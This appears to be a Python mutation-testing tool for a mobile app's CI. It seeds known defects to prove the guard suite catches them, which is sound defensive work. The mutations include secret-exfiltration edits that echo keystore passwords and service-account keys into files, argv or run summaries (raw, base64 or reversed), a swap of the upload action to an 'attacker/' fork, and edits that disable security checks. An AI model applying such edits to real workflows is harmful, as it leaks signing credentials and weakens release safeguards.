#!/usr/bin/env python3
"""Apply known defects to the repository and require the guard suite to catch each.

Four verification rounds of M1 found ~50 defects, and every one of #167-#175 is
the same sentence: *a mutation survived*. Guards were written, believed, and
then shown to be substring checks or scoped to one job. The only thing that
reliably told us so was mutating the code and watching the suite stay green.

So that check stops being something a reviewer does by hand once a round, and
becomes a step CI runs every time.

Each entry below is a defect this project actually shipped or nearly shipped,
with the issue that found it. The battery fails if the suite does NOT go red.

Two rules learned the hard way:

  * A mutation must really change the file. A pattern that no longer matches
    silently tests nothing (#160).
  * A mutation of a YAML file must leave it PARSEABLE. A mutation that breaks
    the syntax makes the guard fail for the wrong reason and reports a false
    pass -- which is exactly what #172 was: `replaceFirst` inserted a literal
    `$1`, the YAML broke, and the battery called it caught.

Usage:  tools/mutation_check.py [--list] [--only SUBSTRING]
Exit:   0 every mutation was caught
        1 at least one survived (the suite stayed green)
        2 the battery could not run (dirty tree, bad pattern, unparseable)
"""
from __future__ import annotations

import argparse
import json
import dataclasses
import pathlib
import re
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
# The guard suite, minus any `slow`-tagged test.
#
# Two kinds carry it: `the flag the workflow sets is the flag the guard
# reads`, which spawns a child `flutter test` (#245), and the engine property
# guards, engine_guard_*_test.dart, which generate hundreds of boards (#26).
# The entries that need them set `slow=True`. The reason is real and was
# measured: a guard whose input is expensive is run once per mutation, and a
# 45s test turns a 20-minute battery into 90 (#229). The `weekly` engine tier
# is never tagged `guard`, so neither suite here runs it.
SUITE = ["flutter", "test", "--no-pub", "--tags", "guard",
         "--exclude-tags", "slow"]
SUITE_SLOW = ["flutter", "test", "--no-pub", "--tags", "guard"]
# The engine property guards alone. A mutation of the engine is judged by
# the guards written for the engine: running the whole slow suite for each
# one cost about three minutes a mutation, in a job that already used 44 to
# 51 of its 60 minutes before they arrived (CI runs 35877061156, 35898299127,
# 35907570513, read 2026-09-23 with `gh api .../actions/runs/<id>/jobs`).
ENGINE_SUITE = ["flutter", "test", "--no-pub",
                "test/guards/engine_guard_4x4_test.dart",
                "test/guards/engine_guard_6x6_test.dart",
                "test/guards/engine_guard_9x9_test.dart",
                "test/guards/engine_guard_16x16_test.dart"]
IN_FLIGHT = ROOT / ".mutation_check_in_flight"


@dataclasses.dataclass(frozen=True)
class Mutation:
    issue: str
    name: str
    path: str
    apply: object  # str -> str
    why: str
    expect: str = ""
    also: tuple = ()
    slow: bool = False
    creates: tuple = ()
    suite: tuple = ()
    """A substring of the reason the RIGHT assertion prints when it fires.

    Without this the battery measures "the suite went red", which is not the
    same as "this guard caught it" -- the first version of this file reported
    two mutations as caught when what had actually failed was an unrelated
    test that happens to read the same file. That is the mistake the battery
    exists to find, made by the battery.

    `creates` names paths the mutated code WRITES while the suite runs, so
    they can be removed afterwards. Restoring the mutated file is not enough:
    the workspace mutation makes a script drop a password into the repository
    root, that file outlived the run, and it was then swept into a commit by
    `git add -A` -- twice. Being tracked, it went into the leak scan's skip
    set and blinded the very guard the mutation exists to exercise (#213).

    `also` carries further `(path, apply)` edits. Some defects are not
    expressible in one file: #203 is "a second parse path is added AND the
    rules are repointed at it", and the one-file version -- repoint the rules
    at a method that does not exist -- only breaks the compile. That reported
    WRONG-REASON, correctly, for two rounds. A mutation that cannot be written
    truthfully is not a mutation.
    """


def sub(pattern: str, replacement: str, count: int = 1, flags: int = 0):
    """A regex substitution that must match, with the group expansion Dart's
    replaceFirst does NOT do (#172)."""

    def go(text: str) -> str:
        out, n = re.subn(pattern, replacement, text, count=count, flags=flags)
        if n == 0:
            raise LookupError(f"pattern never matched: {pattern!r}")
        return out

    return go


def append(block: str):
    return lambda text: text.rstrip("\n") + "\n" + block


def chain(*steps):
    """Several substitutions on one file, in order.

    A defect that MOVES something is two edits, and writing it as one -- a
    delete without the matching insert -- tests a different defect than its
    name claims (#207: the deletion left every refusal working, so the
    ordering assertion correctly stayed silent).
    """

    def go(text: str) -> str:
        for step in steps:
            text = step(text)
        return text

    return go


MUTATIONS: list[Mutation] = [
    # ---- the command must run, not merely appear (#167) -------------------
    Mutation("#167", "gate.sh made advisory", ".github/workflows/ci.yml",
             sub(r"run: tools/gate\.sh$", "run: tools/gate.sh || true", flags=re.M),
             "CI would run the gate and ignore its verdict",
             'ci-shape: the gate step must run'),
    Mutation("#167", "invariant-1 scan made advisory", ".github/workflows/release.yml",
             sub(r"run: tools/check_aab\.sh$", "run: tools/check_aab.sh || true", flags=re.M),
             "the permission scan's failure would be discarded on the tag path",
             'release-shape: `scan` must run'),
    Mutation("#167", "certificate check made advisory", ".github/workflows/release.yml",
             sub(r"run: tools/verify_upload_cert\.sh$",
                 "run: tools/verify_upload_cert.sh || true", flags=re.M),
             "a bundle signed with the wrong key would ship",
             'release-shape: `cert` must run'),
    Mutation("#167", "invariant guards made advisory", ".github/workflows/ci.yml",
             sub(r"(run: flutter test --no-pub --tags guard --exclude-tags weekly,bench)$", r"\1 || true", flags=re.M),
             "a breached invariant would not fail the PR",
             'ci-shape: the invariant guards'),

    # ---- tracing (#168) ---------------------------------------------------
    Mutation("#168", "workflow-level shell: bash -x", ".github/workflows/release.yml",
             sub(r"^    shell: bash$", "    shell: bash -x", flags=re.M),
             "traces every step in the job holding all five secrets",
             'traces every expanded command'),
    Mutation("#168", "workflow-level shell: bash -x in ci", ".github/workflows/ci.yml",
             sub(r"^    shell: bash$", "    shell: bash -x", flags=re.M),
             "same, on every pull request",
             'traces every expanded command'),

    # ---- scope: a second job (#169) ---------------------------------------
    Mutation("#169", "a second job uploads to production", ".github/workflows/release.yml",
             append("""  publish_prod:
    needs: ship
    runs-on: ubuntu-latest
    steps:
      - id: play2
        uses: r0adkll/upload-google-play@v1
        with:
          serviceAccountJsonPlainText: ${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
          packageName: com.honestarcade.sudoku
          releaseFiles: build/app/outputs/bundle/release/app-release.aab
          track: production
          status: completed"""),
             "automation reaches production, and the summary still says internal",
             'release-shape: exactly these three jobs'),
    Mutation("#169", "continue-on-error on the gate job", ".github/workflows/release.yml",
             sub(r"^  gate:$", "  gate:\n    continue-on-error: true", flags=re.M),
             "`needs: gate` succeeds on a red gate, so a failing build ships",
             'carries `continue-on-error`'),
    Mutation("#169", "the Play upload becomes conditional", ".github/workflows/release.yml",
             sub(r"(      - id: play\n)", r"\1        if: always()\n"),
             "an earlier failure no longer prevents the upload",
             'release-shape: `if:` or `continue-on-error` on the upload'),
    Mutation("#169", "the upload action is swapped for a fork", ".github/workflows/release.yml",
             sub(r"r0adkll/upload-google-play@v1", "attacker/upload-google-play@v1"),
             "a fork of the action receives the Play credential",
             'release-shape: the upload action must be the pinned one'),
    Mutation("#169", "the package name is changed", ".github/workflows/release.yml",
             sub(r"packageName: com\.honestarcade\.sudoku", "packageName: com.attacker.app"),
             "the bundle is uploaded against someone else's listing",
             'release-shape: the upload must name THIS package'),

    # ---- triggers (#170) --------------------------------------------------
    # ---- #190: the leak shapes #176 listed and did not close ---------------
    Mutation("#190", "a secret is written to a file under HOME", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "$KEYSTORE_PASS" > "$HOME/leak.txt"\n'),
             "a secret on disk is leaked as surely as one printed",
             'reached file'),
    Mutation("#190", "a partial secret, first 8 characters", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "pw8: ${KEYSTORE_PASS:0:8}"\n'),
             "eight characters of a password narrows a search enormously",
             'first 8 characters'),
    Mutation("#190", "a base64-transformed secret", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1printf %s "$KEYSTORE_PASS" | base64\n'),
             "a literal scan is defeated by any encoding, trivially reversible",
             # `(as base64)` — the transform the leak scan NAMES when it
             # fires. `'base64'` alone was in the text this mutation inserts
             # (`| base64`), so a guard echoing the offending line satisfied
             # it; the inserted-text audit found that the day it was added
             # (#244).
             '(as base64)'),
    Mutation("#190", "the password moves onto keytool's argv", "tools/set_ci_secrets.sh",
             sub(r"-storepass:env HS_PASS_PROBE", '-storepass "$KEYSTORE_PASS"'),
             "the password becomes readable from the process table by anything on the machine",
             'reached keytool.log'),
    Mutation("#190", "make_upload_key.sh prints the password", "tools/make_upload_key.sh",
             sub(r'(chmod 600 "\$KEYSTORE"\n)', r'\1echo "pw: $HS_KEYSTORE_PASS"\n'),
             "the only script holding the plaintext password was outside the leak group",
             'reached stdout'),
    # ---- #208: the channels and the chokepoint ---------------------------
    # All four were GREEN at round eight.
    Mutation("#208", "the service-account key goes on gcloud's command line",
             ".github/workflows/play-api-check.yml",
             sub(r'(gcloud auth activate-service-account --key-file "\$key" --quiet)',
                 r'\1 --debug-sa "$PLAY_SERVICE_ACCOUNT_JSON"', 1),
             "the whole key lands in the process table, readable by any later step",
             'gcloud.log'),
    # The workspace channel. The previous pass removed this entry, reasoning
    # that the channel reached the file but nothing matched. That reasoning was
    # wrong: the leak was written to `hs-leak-probe.txt`, a debugging artefact
    # the pass had itself committed, and a TRACKED file was skipped before it
    # was ever read (#213). The channel was never the problem.
    Mutation("#208", "a password is written into the workspace",
             "tools/set_ci_secrets.sh",
             sub(r'(KEY_PASS="\$\(read_credential HS_KEY_PASS\)"\n)',
                 r'\1printf "%s" "$KEYSTORE_PASS" > "$PWD/hs-workspace-leak.txt"\n', 1),
             "on CI the workspace is $GITHUB_WORKSPACE, which upload-artifact sweeps",
             'GITHUB_WORKSPACE',
             creates=("hs-workspace-leak.txt",)),
    Mutation("#208", "the key is copied beside the one path forget removes",
             ".github/workflows/play-api-check.yml",
             sub(r'(\n(\s*)gcloud auth activate-service-account)',
                 r'\n\2mkdir -p "$RUNNER_TEMP/keep"\n\2cp "$key" "$RUNNER_TEMP/keep/play-sa.json"\1', 1),
             "the suffix exemption covered any path ending in that name",
             'leak:'),
    Mutation("#208", "a process is started outside the chokepoint",
             "test/guards/secrets_scripts_test.dart",
             sub(r"(\nvoid main\(\) \{)",
                 r'\nvoid _bypass() async {\n'
                 r'  await Process.start("/bin/bash", ["x.sh"]);\n'
                 r'}\1', 1),
             "Process.start, Process.run and tear-offs all walked past the old rule",
             'leak-chokepoint'),
    # ---- #206: the key link, proven by running the step ------------------
    # All three were GREEN at round eight, against `tools/play_promote.sh` --
    # the one key link no other guard covered -- because the test asked
    # whether the step's TEXT contained the script name.
    Mutation("#206", "play_promote.sh's failure is swallowed",
             ".github/workflows/play-promote.yml",
             sub(r'(\| tee "\$RUNNER_TEMP/promote\.out")', r"\1 || true", 1),
             "every refusal the script makes can be neutered while the step reports success",
             'propagation'),
    Mutation("#206", "the play_promote.sh call is commented out",
             ".github/workflows/play-promote.yml",
             sub(r"^(\s*)(tools/play_promote\.sh)", r"\1# \2", 1, re.M),
             "a substring in a shell comment satisfied the old key-link test",
             'vacuity'),
    Mutation("#206", "play_promote.sh is renamed to a file that does not exist",
             ".github/workflows/play-promote.yml",
             sub(r"tools/play_promote\.sh", "tools/play_promote.sh.disabled", 1),
             "the workflow called a missing file while the guard reported the link wired",
             'vacuity'),
    # GREEN at round eight: only PROMOTE_OUTCOME was pinned, so a real
    # internal->alpha promotion could publish "internal -> production".
    Mutation("#209", "the summary step's TO_TRACK is a literal production",
             ".github/workflows/play-promote.yml",
             sub(r"(PROMOTE_OUTCOME:[^\n]*\n(?:[^\n]*\n)*?\s*)TO_TRACK: \$\{\{ inputs\.to_track \}\}",
                 r"\1TO_TRACK: production", 1),
             "a forged production claim in the run summary — #142's threat model",
             "refusal: the summary step's TO_TRACK is"),
    # ---- #203: the parse path, decided by running the rules --------------
    # The mutation the TEXT assertion cannot see. Repointing five of six call
    # sites satisfies its set equality, because one surviving `Workflow.parse(`
    # is all it looks for. Round eight proved that green. The execution test
    # catches it, which is the whole of #205 in one entry.
    Mutation("#203", "five of six rules reach an unguarded second parse path",
             "test/guards/workflow_rules.dart",
             sub(r"Workflow\.parse\(", "WorkflowFast.of(", 5),
             "the rules reach a parse path with no error handling at all",
             'parse-path',
             also=(("test/guards/workflow_yaml.dart",
                    append("extension WorkflowFast on Workflow {\n"
                           "  static Workflow of(String path, String text) {\n"
                           "    final doc = loadYaml(text);\n"
                           "    return Workflow.parse(path, text, load: (_) => doc);\n"
                           "  }\n"
                           "}\n")),)),
    # ---- #217: the Error path, in a worker isolate --------------------------
    # The bypass that passed both guards at round nine: a parse path that
    # catches YamlException and NOT Error, so every document of the six-row
    # test comes back reported while a real overflow escapes. Only the
    # worker-isolate test can see it, which is why its marker is its own.
    Mutation("#217", "five of six rules reach a parse path that catches only YamlException",
             "test/guards/workflow_rules.dart",
             sub(r"Workflow\.parse\(", "WorkflowQuick.of(", 5),
             "an overflow in the loader escapes as a crash; the six-row test is green",
             # The COLON. `'overflow'` alone is a substring of the test's own
             # name, which the runner prints on every run including a green
             # one, so both of these entries scored `caught` for any red
             # suite whatever and could never report WRONG-REASON (#238).
             'overflow:',
             also=(("test/guards/workflow_yaml.dart",
                    append("extension WorkflowQuick on Workflow {\n"
                           "  static Workflow of(String path, String text) {\n"
                           "    dynamic doc;\n"
                           "    try {\n"
                           "      doc = loadYaml(text);\n"
                           "    } on YamlException catch (e) {\n"
                           "      return Workflow.parse(path, text, load: (_) => throw e);\n"
                           "    }\n"
                           "    return Workflow.parse(path, text, load: (_) => doc);\n"
                           "  }\n"
                           "}\n")),)),
    Mutation("#217", "the StackOverflowError handler is removed from Workflow.parse",
             "test/guards/workflow_yaml.dart",
             sub(r"    \} on StackOverflowError \{\n(?:.*\n)*?        'unparseable: nesting too deep to load',\n      \);\n",
                 "", 1),
             "#177's crash, verbatim: the overflow is an Error and nothing catches it",
             'overflow:'),

    # Both GREEN at 933cfad: `target` and the `pull_request` rule were never
    # read, and either change leaves `main` unguarded with the guard silent.
    Mutation("#219", "the ruleset stops targeting branches",
             "test/guards/workflow_guard_test.dart",
             sub(r"(final doc = jsonDecode\(payload\) as Map<String, dynamic>;\n)",
                 r"\1      doc['target'] = 'tag';\n", 1),
             "the branch condition then guards nothing",
             'not branches'),
    # ---- #228: the bypass list, decided by a predicate the battery can reach --
    # The branch that reads `bypass_actors` needs a token with Administration,
    # which no local run has, so the logic lives in `_bypassVerdict` and is
    # fed recorded shapes. Both GREEN before the predicate existed, because
    # nothing could reach the branch to test it.
    Mutation("#228", "a lapsed admin token turns the bypass check into a skip",
             "test/guards/workflow_guard_test.dart",
             sub(r"  if \(bypass == null\) \{\n    if \(expected\) \{",
                 "  if (bypass == null) {\n    if (false) {", 1),
             "HS_RULESET_READ_TOKEN expires and the required check quietly stops reading the list",
             'bypass-verdict'),
    Mutation("#228", "a bypass actor is accepted",
             "test/guards/workflow_guard_test.dart",
             sub(r"  if \(bypass is List && bypass\.isEmpty\) return \(skip: false, problem: null\);",
                 "  if (bypass is List) return (skip: false, problem: null);", 1),
             "whoever is on the list can push to main past both checks",
             'bypass-verdict'),
    Mutation("#219", "the pull_request rule is removed from the ruleset",
             "test/guards/workflow_guard_test.dart",
             sub(r"(final doc = jsonDecode\(payload\) as Map<String, dynamic>;\n)",
                 r"\1      (doc['rules'] as List).removeWhere"
                 r"((r) => (r as Map)['type'] == 'pull_request');\n", 1),
             "required checks apply to pull requests; without the rule they are unreachable",
             'no `pull_request` rule'),
    # ---- #215/#216: what a step DOES, not what it exits with -------------
    # All three were GREEN at 933cfad. The first is a secret published from an
    # already-pinned step; the other two are steps that exist to destroy a
    # credential and were exercised by nothing.
    Mutation("#215", "a pinned step publishes the keystore to the run summary",
             ".github/workflows/release.yml",
             sub(r'(          test -s "\$RUNNER_TEMP/upload\.keystore")',
                 r'\1\n          echo "$HS_KEYSTORE_B64" >> "$GITHUB_STEP_SUMMARY"', 1),
             "the base64 of the signing keystore lands in a retained, downloadable summary",
             'published-secret'),
    Mutation("#216", "the shred step stops deleting the keystore",
             ".github/workflows/release.yml",
             sub(r'run: rm -f "\$RUNNER_TEMP/upload\.keystore"',
                 'run: echo "keystore removed"', 1),
             "the decoded signing keystore survives the job",
             'destroys:'),
    Mutation("#216", "the play-api-check forget step stops deleting",
             ".github/workflows/play-api-check.yml",
             sub(r'rm -f "\$RUNNER_TEMP/play-sa\.json" "\$RUNNER_TEMP/upload\.keystore"',
                 'echo "credentials forgotten"', 1),
             "the service-account key and the keystore both survive the job",
             'destroys:'),
    # ---- #224/#225: the positive controls ---------------------------------
    # Every one of these was GREEN at b80cf0f, and each is a test that could
    # not fail for a different reason: a file that was never planted, a body
    # that exited before the leak, a transform nobody searched for, and an
    # exemption keyed on the wrong side of the assignment.
    Mutation("#224", "play-promote's forget stops deleting the key",
             ".github/workflows/play-promote.yml",
             sub(r'(          )rm -f "\$RUNNER_TEMP/play-sa\.json"',
                 r'\1echo "credentials forgotten"', 1),
             "the service-account key survives the job",
             'destroys:'),
    Mutation("#224", "play-api-check's forget drops the key from its rm",
             ".github/workflows/play-api-check.yml",
             sub(r'rm -f "\$RUNNER_TEMP/play-sa\.json" "\$RUNNER_TEMP/upload\.keystore"',
                 'rm -f "$RUNNER_TEMP/upload.keystore"', 1),
             "half the assertion was load-bearing and half asserted nothing",
             'destroys:'),
    Mutation("#224", "the harness stops planting one of the credentials",
             "test/guards/workflow_guard_test.dart",
             sub(r"const _runnerCredentials = \['upload\.keystore', 'play-sa\.json'\];",
                 "const _runnerCredentials = ['upload.keystore'];", 1),
             "the precondition is what stops the assertion going vacuous again",
             'destroys: precondition'),
    Mutation("#225", "a secret is published after the password compare",
             ".github/workflows/release.yml",
             sub(r'(          echo "the keystore opens, and holds the configured alias"\n)',
                 r'\1          echo "$HS_KEYSTORE_PASS" >> "${GITHUB_STEP_SUMMARY:-/dev/null}"\n', 1),
             "distinct sentinels made the body exit before ever reaching this line",
             'published-secret'),
    Mutation("#225", "a secret is published reversed",
             ".github/workflows/release.yml",
             sub(r"(          flutter build appbundle)",
                 r'          printf %s "$HS_KEY_PASS" | rev >> "$GITHUB_STEP_SUMMARY"\n\1', 1),
             "rev is one command and the reader reverses it instantly",
             'published-secret'),
    # ---- #226: the steps that make a claim -------------------------------
    # Both GREEN at b80cf0f. `say` is the only thing on the failed-gate path
    # that says nothing shipped, and it could say the reverse.
    Mutation("#226", "the failed-gate notice claims a release shipped",
             ".github/workflows/release.yml",
             sub(r'echo "gate failed on \$TAG; nothing shipped"',
                 'echo "release $TAG shipped to production"', 1),
             "the workflow announces a shipped release on a gate that failed",
             'honesty'),
    Mutation("#226", "the secrets pre-flight stops checking",
             ".github/workflows/release.yml",
             sub(r'(id: secrets_present\n(?:[^\n]*\n)*?        )run: \|\n(?:          [^\n]*\n|\n)*',
                 r'\1run: echo "all five secrets are present"\n\n', 1),
             "a step named Assert every secret is present announces a check it does not do",
             'secrets-preflight'),
    # ---- #220/#230: the guards that had no mutations ----------------------
    Mutation("#220", "the gcloud stub stops recording its argv",
             "test/guards/secrets_scripts_test.dart",
             sub(r'echo "gcloud \\\$\*" >> "\$\{_tmp\.path\}/gcloud\.log"\n', "", 1),
             "the channel that catches a key on a command line goes quiet",
             'argv: gcloud.log is empty'),
    # Two edits, because removing a protection proves nothing unless the thing
    # it protects against is present. Nothing in the file has the laundering
    # shape today, so the widened window alone changed no verdict and the
    # entry SURVIVED -- the battery reporting, correctly, that it tested
    # nothing (#230).
    Mutation("#220", "the harmless exemption widens, and a call hides behind it",
             "test/guards/secrets_scripts_test.dart",
             chain(
                 sub(r"      if \(harmless\.hasMatch\(lines\[i\]\)\) continue;",
                     "      if (harmless.hasMatch(\n"
                     "        lines.sublist(i, (i + 3).clamp(0, lines.length)).join(' '),\n"
                     "      )) {\n        continue;\n      }", 1),
                 sub(r"(\nvoid main\(\) \{)",
                     r'\nvoid _launder() {\n'
                     r'  Process.runSync("/bin/sh", ["-c", "echo hi"]);\n'
                     r'  Process.runSync("chmod", ["+x", "/tmp/x"]);\n'
                     r'}\1', 1),
             ),
             "a raw call with a chmod two lines away is laundered by the window",
             'leak-chokepoint'),
    Mutation("#230", "make_upload_key stops enforcing a minimum password length",
             "tools/make_upload_key.sh",
             sub(r'if \[ "\$\{#HS_KEYSTORE_PASS\}" -lt 12 \]; then\n(?:.*\n)*?fi\n', "", 1),
             "the leak scan only searches transformed forms for 8+ characters",
             'password-length'),
    Mutation("#230", "the sentinel floor drops back below the transformed-forms threshold",
             "test/guards/secrets_scripts_test.dart",
             sub(r"  if \(v\.length < 8\) \{\n    fail\(\n      'leak-fixture:",
                 "  if (v.length < 4) {\n    fail(\n      'leak-fixture:", 1),
             "a five-to-seven character fixture is searched verbatim only, silently",
             'fixture-floor'),
    Mutation("#230", "make_upload_key stops cd-ing to the repository root",
             "tools/make_upload_key.sh",
             sub(r'cd "\$\(dirname "\$0"\)/\.\."\n', "", 1),
             "the refusal over the committed certificate checks the caller's directory",
             'cert-cwd'),
    # ---- #226, the second half: summary, name_failure, and the two steps ----
    # in play-promote that were run by nothing. All GREEN at 9cc2317.
    Mutation("#226", "the release summary claims production and drops the track",
             ".github/workflows/release.yml",
             sub(r'(        run: \|\n          set -euo pipefail\n          aab=build/app/outputs/bundle/release/app-release\.aab\n)'
                 r'          \{\n(?:            [^\n]*\n|\n)*?          \} >> "\$GITHUB_STEP_SUMMARY"\n',
                 r'\1          echo "### Release $TAG shipped to production, all checks passed" >> "$GITHUB_STEP_SUMMARY"\n', 1),
             "the run summary names a track the release never goes to",
             'honesty'),
    Mutation("#226", "the release summary loses the no-release-note fallback",
             ".github/workflows/release.yml",
             sub(r'            if \[ -f "\$RUNNER_TEMP/no-release-note" \]; then\n'
                 r'              echo ""\n'
                 r'              cat "\$RUNNER_TEMP/no-release-note"\n'
                 r'            fi\n', "", 1),
             "a missing GitHub release is no longer mentioned where the reader looks (#180)",
             'honesty'),
    Mutation("#226", "the failure diagnostic is gutted",
             ".github/workflows/release.yml",
             sub(r"          echo '\$\{\{ toJSON\(steps\) \}\}' \\\n"
                 r"            \| grep -B2 '\"outcome\": \"failure\"' \\\n"
                 r"            \| tee -a \"\$GITHUB_STEP_SUMMARY\" \|\| true\n",
                 '          echo "diagnostics disabled"\n', 1),
             "the post-failure step names nothing; passed at round eleven",
             'honesty'),
    Mutation("#226", "the promote refusal accepts production",
             ".github/workflows/play-promote.yml",
             sub(r'            if \[ "\$track" = "production" \]; then\n'
                 r'              echo "production is a human act in the Play Console" >&2\n'
                 r'              exit 1\n'
                 r'            fi\n', "", 1),
             "the one step standing between a dispatch and the production track",
             'honesty'),
    Mutation("#226", "the promote summary reports a promotion whatever happened",
             ".github/workflows/play-promote.yml",
             sub(r'if \[ "\$PROMOTE_OUTCOME" = "success" \] && \[ -n "\$codes" \]; then',
                 'if true; then', 1),
             "#130 again: 'Promoted on Play' on the failure path",
             'honesty'),
    Mutation("#226", "a [] step loses its covering case and nothing else notices",
             "test/guards/workflow_guard_test.dart",
             sub(r"  'the failed-gate notice does not claim a release': \(\n(?:.*\n)*?  \),\n", "", 1),
             "`say` is [] and no test runs it -- the state #226 found four steps in",
             'coverage'),
    # ---- #232: the base64 stub was a stub ------------------------------------
    # The issue's own reproducer, green at 9cc2317 because `base64` printed a
    # fixed word and the encoding never reached the scan.
    Mutation("#232", "a secret is published through base64",
             ".github/workflows/release.yml",
             sub(r'(          test -s "\$RUNNER_TEMP/upload\.keystore")',
                 r'\1\n          printf %s "$HS_KEYSTORE_B64" | base64 >> "$GITHUB_STEP_SUMMARY"', 1),
             "base64 is one command and a reader of the summary decodes it instantly",
             'published-secret'),
    Mutation("#232", "the password is bound to an env key spelled ALIAS and published",
             ".github/workflows/release.yml",
             sub(r'(          HS_KEY_ALIAS: \$\{\{ secrets\.HS_KEY_ALIAS \}\}\n          HS_KEY_PASS: \$\{\{ secrets\.HS_KEY_PASS \}\}\n)',
                 r'\1          HS_KEYSTORE_ALIAS: ${{ secrets.HS_KEYSTORE_PASS }}\n', 1),
             "exempting by env NAME let any *ALIAS key carry any secret (#225); keyed on the secret now",
             'published-secret',
             also=((".github/workflows/release.yml",
                    sub(r'(          echo "the keystore opens, and holds the configured alias"\n)',
                        r'\1          echo "$HS_KEYSTORE_ALIAS" >> "$GITHUB_STEP_SUMMARY"\n', 1)),)),
    # ---- #202: the ruleset, compared as whole tokens ---------------------
    # All three were GREEN at round eight: `contains('active')` is satisfied
    # by `inactive`, and `contains('gate:15368')` by `CI / gate:15368` --
    # the PR UI rendering the guard's own message warns about.
    Mutation("#202", "a disabled ruleset is accepted", "test/guards/workflow_guard_test.dart",
             sub(r"(final doc = jsonDecode\(payload\) as Map<String, dynamic>;\n)",
                 r"\1      doc['enforcement'] = 'disabled';\n", 1),
             "the merge gate can be switched off and the guard says nothing",
             'ruleset:'),
    Mutation("#202", "the PR-UI rendering is accepted as the context",
             "test/guards/workflow_guard_test.dart",
             sub(r"'\$\{\(check as Map\)\['context'\]\}:\$\{check\['integration_id'\]\}',",
                 "'CI / ${(check as Map)['context']}:${check['integration_id']}',", 1),
             "#137's exact failure: the rendered name is not the check-run name",
             'ruleset:'),
    Mutation("#202", "the ruleset stops targeting the default branch",
             "test/guards/workflow_guard_test.dart",
             sub(r"(final doc = jsonDecode\(payload\) as Map<String, dynamic>;\n)",
                 r"\1      (doc['conditions']['ref_name'] as Map)['include'] = "
                 r"['refs/heads/nothing'];\n", 1),
             "a ruleset can be active and still not guard main",
             'ruleset:'),
    # ---- #203/#207: the call site, and the ordering ----------------------
    # The defect as it would really arrive: the second entry point is ADDED,
    # and then the rules are repointed at it. Both halves, or the mutation is
    # a compile error wearing the name of a guard failure.
    Mutation("#203", "a second parse path is added and the rules repointed at it",
             "test/guards/workflow_rules.dart",
             sub(r"Workflow\.parse\(", "Workflow.parseFast(", 0),
             # Honest about what this one does: `parseFast` delegates with the
             # DEFAULT loader, so the handler stays reachable. It is a rename,
             # and the text assertion is what catches it (#217).
             "the rules reach Workflow through a name the call-site rule does not allow",
             'parse-path',
             also=(("test/guards/workflow_yaml.dart",
                    sub(r"(  static Workflow parse\(\n)",
                        "  static Workflow parseFast(String path, String text) =>\n"
                        "      parse(path, text);\n\n"
                        r"\1")),)),
    # A MOVE, not a delete: deleting the token check leaves every refusal
    # working, so the ordering assertion is right to stay silent (#207).
    Mutation("#207", "the token check moves above the argument checks", "tools/play_promote.sh",
             chain(
                 sub(r'\n# ---- credential -+\n\n\[ -n "\$\{PLAY_TOKEN:-\}" \] \|\| '
                     r'die_args "PLAY_TOKEN is not set"\n', "\n"),
                 sub(r"(# ---- arguments, before anything else -+\n\n)",
                     '\\1[ -n "${PLAY_TOKEN:-}" ] || die_args "PLAY_TOKEN is not set"\n\n'),
             ),
             "a bad track is no longer refused before the token is demanded",
             'order:'),
    # ---- #204: the shell questions, asked of bash ------------------------
    Mutation("#204", "|| true hidden behind a shell comment", ".github/workflows/release.yml",
             sub(r'(-alias "\$HS_KEY_ALIAS" > /dev/null)\n', r'\1 || true # tolerate\n'),
             "a `#` inside the line defeated the regex; bash is not fooled",
             'propagation'),
    Mutation("#204", "set +o errexit, the long form", ".github/workflows/release.yml",
             sub(r"(          set -euo pipefail\n)(          # A PKCS12)", r"\1          set +o errexit\n\2"),
             "the regex matched `set +e` and not its synonym",
             'propagation'),
    Mutation("#204", "the permission scan is backgrounded", ".github/workflows/release.yml",
             sub(r"(run: tools/check_aab\.sh)$", r"\1 &", 1, re.M),
             "a backgrounded command's exit status is never waited on",
             'propagation'),
    # The mutation that was GREEN until the vacuity check landed: the build
    # step stops building. `${{ … }}` is a bash bad substitution, so the body
    # aborted before `flutter` was ever reached and `isNot(0)` held whatever
    # the step did (round eight).
    Mutation("#204", "the build step stops building", ".github/workflows/release.yml",
             sub(r"^(\s*)flutter build appbundle(?:[^\n]*\\\n)*[^\n]*\n",
                 r'\1echo "built"\n', 1, re.M),
             "the step that produces the shipped bundle no longer produces it",
             'propagation'),
    # And the guard on that guard: without the expansion the harness performs,
    # `build` cannot pass, and the vacuity assertion must say so.
    Mutation("#204", "the harness stops expanding ${{ }} before bash sees it",
             "test/guards/workflow_guard_test.dart",
             # Anchored on the grouped form `([^}]*)` the expansion took when it
             # became `replaceAllMapped` for `expressions:` (#226); the previous
             # anchor went BROKEN in the eleventh pass's own battery run.
             sub(r"RegExp\(r'\\\$\\\{\\\{\(\[\^\}\]\*\)\\\}\\\}'\)",
                 "RegExp(r'(THIS-MATCHES-NOTHING)')", 1),
             "a step that cannot pass makes its propagation check unfalsifiable",
             'vacuity'),
    # Round eight: both of these were GREEN. The step set was pinned for two
    # of four files, so the job that runs on every failed gate -- and reads
    # every workflow-level secret -- was unpinned, and a brand-new workflow
    # file was not looked at by anything.
    Mutation("#209", "a step exfiltrates the keystore from report-gate-failure",
             ".github/workflows/release.yml",
             sub(r"^      - id: say$",
                 '      - id: sneak\n'
                 '        name: Sneak\n'
                 '        run: echo "$HS_KEYSTORE_B64" >> "$GITHUB_STEP_SUMMARY"\n'
                 '\n'
                 '      - id: say',
                 1, re.M),
             "the job that runs on every failed gate was pinned by name only",
             'step-set'),
    # ---- #208/#206/#209: the chokepoint, the key links, the step sets -----
    Mutation("#208", "the service-account key reaches the job summary",
             ".github/workflows/play-api-check.yml",
             sub(r'(            echo "Tracks: \$\{names:-none yet[^\n]*\n)',
                 r'\1            echo "sa: $PLAY_SERVICE_ACCOUNT_JSON"\n'),
             "the whole private key lands in a rendered, retained, downloadable artifact",
             # The step that publishes it, not the word `reached`: that word
             # is in a conditional message `signing_guard_test.dart` prints
             # where no Android SDK exists — true of CI's battery job and not
             # of a developer's machine, so the audit refused in one place and
             # passed in the other (#244, measured 2026-09-22).
             'step `play` writes the value'),
